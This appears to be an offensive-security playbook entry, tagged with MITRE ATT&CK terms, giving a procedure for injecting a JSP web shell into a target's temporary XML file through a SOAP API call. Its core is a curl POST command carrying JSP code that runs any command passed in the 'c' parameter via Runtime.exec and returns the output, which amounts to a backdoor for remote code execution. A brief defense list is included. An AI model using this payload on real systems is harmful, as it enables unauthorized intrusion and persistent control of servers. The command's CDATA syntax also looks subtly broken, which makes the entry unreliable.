---
tags:
  - jsp-shell
  - web-shell
type: procedure
tools:
  - '[[tools/curl]]'
tactics:
  - '[[Execution]]'
commands:
  - '[[commands/curl-post-xxe-test]]'
verified: false
platforms:
  - Web
  - Java
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Web Shell]]'
updated_at: '2025-12-14T17:24:07.974Z'
sub_techniques: []
id: 636af9eb-6cf4-4a76-9ba2-fa329193bd36
validated: true
mitre_tactics:
  - '[[Execution]]'
mitre_techniques:
  - '[[Web Shell]]'
---
# Inject-JSP-Shell-Payload

## Summary

This procedure injects a JSP web shell into the temporary XML file using the deployed service's api:main method, embedding code that executes system commands via Runtime.exec.

## Description

Leverage the writable temp file by calling api:main with parameters containing CDATA-wrapped JSP code. The shell checks for a 'c' parameter and runs it as a process, outputting results. This creates a backdoor for RCE.

## Requirements

1. Copied XML in /tmp/QAusGyxGqQqyVEhqzPbu/
2. Active malicious service
3. JSP code snippet ready

## Defense

Defensive measures and detection strategies:

- Scan uploaded or modified files for executable code (e.g., JSP tags)
- Implement file integrity monitoring on web directories
- Use application firewalls to block suspicious SOAP payloads

## Objectives

1. Embed executable web shell code
2. Enable command execution via HTTP
3. Prepare for webroot deployment

## Instructions

### Step 1: Send Injection Payload

**Context**: POST SOAP with JSP code in CDATA to modify the temp file.

**Command** ([[commands/curl-post-xxe-test]]):
```bash
curl -k -X POST -H "Content-Type: text/xml" https://target/pspc/services/lmJyaVBUrfcEfJw -d '<soap:Envelope...><api:main><param><![CDATA[<%@ page import="java.util.*,java.io.*"%><% if (request.getParameter("c") != null) { Process p = Runtime.getRuntime().exec(request.getParameter("c")); BufferedReader br = new BufferedReader(new InputStreamReader(p.getInputStream())); String line; while ((line = br.readLine()) != null) { out.println(line); } }%>]></param></api:main></soap:Envelope>'
```

> Expected: Payload injected; file now contains JSP shell.

## MITRE ATT&CK Mapping

### Tactics

- [[Execution]]

### Techniques

- [[Web Shell]]

### Sub-Techniques


## Commands Used

- [[commands/curl-post-xxe-test]]

## Tools Used

- [[tools/curl]]

## Tags

- [[jsp-shell]]
- [[web-shell]]
